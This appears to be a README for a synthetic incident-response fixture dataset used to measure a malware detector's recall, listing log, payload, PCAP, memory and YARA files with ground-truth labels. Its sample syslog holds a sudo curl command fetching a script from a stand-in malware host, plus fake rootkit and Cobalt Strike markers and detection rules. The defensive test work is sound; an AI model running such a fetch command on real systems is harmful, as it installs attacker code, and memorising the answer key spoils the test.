<!-- SPDX-License-Identifier: CC0-1.0 -->

# FIND EVIL Fixture Dataset

**Version**: 0.1.0 (Phase 2 initial)  
**Status**: Complete (Phase 2 Step 4)  
**Last Updated**: 2026-04-30

## Overview

Curated ground-truth fixture corpus for measuring `find-evil-mcp` detector accuracy (recall ≥0.60 gate, Phase 2 D-15: 2026-06-01).

**Location**:
- Persistent storage: `/mnt/disk1/forrich/data/find-evil-fixtures/`
- Symlink in repo: `repos/find-evil-fixtures/` (relative to project root)

**Total footprint**: 64 KB (under 5 MB limit)

## Fixture Inventory

### case-001: Synthetic Multi-Source Incident

**Metadata**:
| Property | Value |
|----------|-------|
| case_id | 11111111-2222-4333-8444-555555555555 |
| case_name | case-001 |
| created_date | 2026-04-30 |
| synthetic | true |
| description | Synthetic FIND EVIL fixture with embedded malware indicators |

**Evidence Sources** (5 files, 7.8 KB total):

#### 1. syslog.log (5.5 KB)
50-line syslog with 3+ embedded evil markers:
- **Brute-force**: `Failed password for invalid user root from 198.51.100.7 port 31337` (SSH login attempt)
- **Suspicious command**: `sudo: eve : TTY=pts/0 ; USER=root ; COMMAND=/bin/curl http://malware.example/payload.sh` (download from external domain)
- **Kernel exploit**: `kernel: hostile-driver-load: module=rootkit.ko sha256=deadbeef…` (LKM injection)

SHA-256: `6a2630a3db10f0515a0f667cd9d738627f44e1a83c0f1bf099182e6b399ef339`

#### 2. payload.bin (256 B)
Binary payload containing Cobalt Strike beacon markers:
- Literal string: `"Cobalt Strike beacon_id=42 suspicious_beacon_payload"`
- Padded with null bytes to 256 bytes
- Designed to trigger YARA rule: `beacon_payload`

SHA-256: `99ebacd9a9e38c3aef7399f90a995946fd0d8c7c1bba6c4545d77d71817f97f5`

#### 3. sample.pcap (234 B)
Synthetic PCAP file with 3 TCP SYN flows:
- **Format**: libpcap (magic: 0xd4c3b2a1 little-endian, version 2.4)
- **Flows**:
  - 10.10.10.10.12345 → 203.0.113.5.22 (TCP SYN)
  - 10.10.10.11.12345 → 203.0.113.6.22 (TCP SYN)
  - 10.10.10.12.12345 → 203.0.113.7.22 (TCP SYN)
- **Verification**: tcpdump-readable, all packets render correctly

SHA-256: `79aa9e97a6553f7ec4b02ce9046b1ec921f94527bb7529a875a0a25a1ee69408`

#### 4. memory.dmp (1.0 KB)
Placeholder memory dump with JSON metadata:
```json
{
  "_synthetic": true,
  "expected_pids": [4, 200, 1337],
  "malfind_pids": [1337],
  "note": "Placeholder memory dump - no real Volatility3 compatibility required"
}
```
- **Purpose**: Unit testing for `memory.process_list()` and `memory.malfind()` without requiring real volatility images
- **Note**: Not a real Volatility3 dump (Phase 2 test uses mock parsing)

SHA-256: `4a8bbdb10dca6e4c372de6acc34b436fefd00196d9ab2c97f3154dbbd3fc788b`

#### 5. yara_rules/evil.yar (432 B)
2 detection rules (Apache 2.0):
```yara
rule beacon_payload {
    meta:
        description = "Detects Cobalt Strike beacon payload markers"
        severity = "high"
    strings:
        $a = "Cobalt Strike"
        $b = "beacon_id="
    condition:
        any of them
}

rule rootkit_marker {
    meta:
        description = "Detects rootkit module loading"
        severity = "critical"
    strings:
        $r = "rootkit.ko"
    condition:
        $r
}
```

SHA-256: `847843bddab946e32da0dd9cb76ddb558c20a5791b507bb732d87de6164fb130`

## Ground-Truth Labels

**Manifest file**: `cases/case-001/manifest.json`

**Expected findings**: 13 total

### iocs.scan (2 matches)
| Rule | File | Severity | Expected |
|------|------|----------|----------|
| beacon_payload | payload.bin | high | 1 match |
| rootkit_marker | syslog.log | critical | 1 match |

### log.query (4 queries with hits)
| Query | Source | Expected Hits | Severity | Description |
|-------|--------|---------------|----------|-------------|
| "Failed password" | syslog.log | ≥4 | medium | SSH brute-force |
| "rootkit.ko" | syslog.log | ≥1 | critical | Kernel module loading |
| "/bin/curl" | syslog.log | ≥1 | high | Suspicious download command |
| "malware.example" | syslog.log | ≥1 | high | External malware domain |

### memory.process_list (3 processes)
| PID | Name | Suspicious Flags | Expected | Description |
|-----|------|------------------|----------|-------------|
| 4 | kthreadd | [] | 1 | Kernel thread daemon (benign) |
| 200 | systemd | [] | 1 | Init system (benign) |
| 1337 | malicious_process | [code_injected] | 1 | Process with code injection |

### memory.malfind (1 injected region)
| PID | VAD Start | VAD End | Protection | Severity | Expected |
|-----|-----------|---------|------------|----------|----------|
| 1337 | 0x7fff0000 | 0x7fff1000 | PAGE_EXECUTE_READWRITE | critical | 1 match |

### net.flow_summary (3 flows)
| Src IP | Src Port | Dst IP | Dst Port | Proto | Severity | Expected |
|--------|----------|--------|----------|-------|----------|----------|
| 10.10.10.10 | 12345 | 203.0.113.5 | 22 | TCP | medium | 1 flow |
| 10.10.10.11 | 12345 | 203.0.113.6 | 22 | TCP | medium | 1 flow |
| 10.10.10.12 | 12345 | 203.0.113.7 | 22 | TCP | medium | 1 flow |

## Recall Gate Criterion

**Phase 2 D-15 deadline**: 2026-06-01

**Minimum requirement**: recall ≥ 0.60 across all detector tools

**Recall formula**:
```
recall = (matches_found) / (expected_findings_total)
```

**For case-001 (single fixture)**:
- If all tools detect all findings: recall = 13/13 = 1.0 (100%)
- Gate passes if detector achieves ≥ 0.60 (60%) across diverse test cases

**Accuracy measurement pipeline**:
1. Load fixture via `case.open(mem_path="/evidence/case-001/evidence/memory.dmp")`
2. Run each tool and collect results
3. Compare against manifest.json::expected_findings
4. Compute recall per tool
5. Average recall across all tools
6. Verify ≥0.60 threshold

## Integration with find-evil-mcp

### MCP Tool Usage Example

```python
# Load fixture
case_resp = client.call_tool("case.open", {
    "mem_path": "/evidence/case-001/evidence/memory.dmp"
})
case_id = case_resp["case_id"]

# Scan for IOCs
ioc_resp = client.call_tool("iocs.scan", {
    "case_id": case_id,
    "ruleset": "yara_custom"
})

# Verify against manifest
manifest = json.load(open("cases/case-001/manifest.json"))
expected_iocs = manifest["expected_findings"]["iocs.scan"]
assert len(ioc_resp["matches"]) >= len(expected_iocs)
```

### CI/CD Integration

Expected `make accuracy` command:
```bash
make -C harness/find-evil accuracy
# Runs detector on all fixtures
# Computes recall per tool
# Reports: recall_mean >= 0.60 ? PASS : FAIL
```

## Provenance & License

### Synthetic Fixtures
- **Created**: 2026-04-30
- **Author**: FIND EVIL evidence curator (Claude Code)
- **License**: CC0 (public domain)
- **Content**: Hand-crafted, no third-party samples
- **Malware**: No real binaries included; only synthetic markers

### YARA Rules
- **License**: Apache 2.0
- **Created**: 2026-04-30
- **Source**: Custom (this project)

### SHA-256 Checksums
All checksums stored in `checksums.txt` with provenance comments.

## SANS Starter Case (sans-starter)

Acquired 2026-05-09 from the official SANS FIND EVIL hackathon resources.

| Field | Value |
|-------|-------|
| **Source URL** | <https://sansorg.egnyte.com/fl/HhH7crTYT4JK> |
| **Cited at** | <https://findevil.devpost.com/resources> |
| **Storage path** | `/mnt/disk1/INCUBATOR/warvis-findEvil-fixtures/sans-starter/` |
| **Repo symlink** | `repos/find-evil-fixtures/cases/sans-starter/evidence/` |
| **MANIFEST** | `repos/find-evil-fixtures/cases/sans-starter/MANIFEST.md` |
| **Folder origin** | `SRL-2018/` (multi-host enterprise simulation, 22 memory dumps + sibling disk images) |

### Acquired so far (B1 deliverable)

| Artifact | Type | Size | SHA256 (head) | Origin MD5 verified |
|----------|------|------|---------------|:--:|
| `base-wkstn-05-memory.7z` | 7z archive | 626 MB | `9e518419…` | n/a |
| `base-wkstn-05-memory.img` | raw memory dump | 3.0 GiB | `74ff679b…` | ✅ matches `bb6df5c0…c4fe0` |
| `base-wkstn-05-memory.md5` | dc3dd hash log | 405 B | `822617f7…` | n/a |

Capture provenance (from companion `.md5` log): dc3dd 7.2.641 captured the
physical memory of `base-wkstn-05` at 2018-09-06 19:51:09 UTC from
`/mnt/nfury/base-wkstn-05/pmem/pmem`. The original MD5 has been re-verified
locally — the chain of custody is intact.

### Naming convention note

The `base-` prefix is a SANS naming convention for the canonical case capture.
The SRL-2018 folder is a leaf node — there is no separate `incident-` sibling
directory. Evil, if present, is hidden inside `base-wkstn-05-memory.img` as it
would be in a real-world IR engagement, not segregated into a labelled
"infected" file.

### Out of scope for B1 (handled by B2/B3)

- B2 (`real-tool-installation`): install `yara` / `volatility3` / etc. binaries.
- B3 (`real-hunt-trace`): run a Gemma 4 hunt against `base-wkstn-05-memory.img`,
  capture the audit trail, and update `accuracy-report.md` with measured
  precision/recall against any findings.

### License

SANS-provided case data; usage is governed by SANS hackathon Terms of Use.
The image is NOT redistributed in this repository — only its hash and
provenance metadata are committed. The image itself lives on the contributor's
`/mnt/disk1` partition and is referenced via a tracked symlink.

## Installed Tools (B2 deliverable)

UoW `real-tool-installation` installed the forensic binaries needed to
parse `base-wkstn-05-memory.img` against the existing
`src/find_evil_mcp/sift_runner.py` whitelist (locked Phase 1+2 code).

| Tool | Version | Source | Install path | sift_runner key |
|------|---------|--------|--------------|:---------------:|
| **volatility3** | 2.28.0 | `pip install --user volatility3` (no sudo) | `~/.local/bin/vol`, `~/.local/lib/python3.10/site-packages/volatility3/` | `volatility3` → `vol` |

Symbol cache (downloaded on first parse) lives at
`~/.local/lib/python3.10/site-packages/volatility3/symbols/`. Subsequent
hunts reuse the cache; first-run cost was ~110 file fetches.

### Smoke test — `vol windows.info`

Captured at `repos/find-evil-fixtures/cases/sans-starter/smoke-vol-windows-info.txt`.

Key extracted metadata (proves the .img is a valid Windows memory image):

| Field | Value |
|-------|-------|
| Is64Bit | True |
| NtMajorVersion / NtMinorVersion | 6 / 1 (Windows 7 / Server 2008 R2) |
| NtProductType | NtProductWinNt |
| NtSystemRoot | `C:\Windows` |
| Kernel Base | `0xf80003219000` |
| Layer / memory_layer | `WindowsIntel32e` over `FileLayer` |
| **SystemTime** | **2018-09-06 19:51:09+00:00** ← matches dc3dd capture log to the second |

The SystemTime equality is the strongest end-to-end chain-of-custody anchor:
SANS captured the dump at 2018-09-06 19:51:09 UTC; volatility3 parsed the
same instant from the kernel structures eight years later. The image is
intact and the analyzer is correctly bound to it.

### Out of scope for B2 (deferred or N/A)

| Tool | sift_runner key | Status |
|------|:---------------:|--------|
| yara CLI | `yara` | Deferred — `pip install yara-python` ships only a Python module, not the `yara` CLI; sudo `apt install yara` not requested in B2. Will revisit at B3 if a yara-based hunt step is needed. |
| plaso / log2timeline | `plaso` | N/A for B1 (no disk image acquired yet). |
| zeek / suricata | `zeek` / `suricata` | N/A for B1 (no PCAP acquired yet). |
| sigma | `sigma` | Rule format; no binary needed. |

## File Manifest

| Path | Size | Checksum | Role |
|------|------|----------|------|
| README.md | 1.9 KB | (in repo) | Integration guide |
| checksums.txt | 1.2 KB | (in repo) | SHA-256 manifest |
| cases/case-001/manifest.json | 3.5 KB | fd5b6d9f... | Ground-truth labels |
| cases/case-001/evidence/syslog.log | 5.5 KB | 6a2630a3... | Log evidence |
| cases/case-001/evidence/payload.bin | 256 B | 99ebacd9... | Binary evidence |
| cases/case-001/evidence/sample.pcap | 234 B | 79aa9e97... | Network capture |
| cases/case-001/evidence/memory.dmp | 1.0 KB | 4a8bbdb1... | Memory placeholder |
| cases/case-001/evidence/yara_rules/evil.yar | 432 B | 847843bd... | YARA rules |

## Verification Checklist

- [x] manifest.json: Valid JSON syntax
- [x] payload.bin: Contains "Cobalt Strike beacon_id=" marker
- [x] syslog.log: 50 lines, 6+ evil markers
- [x] sample.pcap: Valid libpcap (magic 0xd4c3b2a1), tcpdump-readable
- [x] memory.dmp: JSON placeholder with expected_pids/malfind_pids
- [x] evil.yar: 2 rules (beacon_payload, rootkit_marker) syntactically valid
- [x] checksums.txt: SHA-256 hashes for all files
- [x] README.md: Integration guide complete
- [x] Total footprint: 64 KB (under 5 MB limit)
- [x] Symlink: repos/find-evil-fixtures accessible

## References

- **Spec**: `plans/ITEM-212-find-evil/spec.md`
- **Architecture**: `docs/find-evil/architecture.md`
- **MCP Schemas**: `harness/find-evil/mcp-schema/` (9 tools)
- **Gates**: `harness/find-evil/gates.yaml` (phase_2.required.recall_min = 0.60)
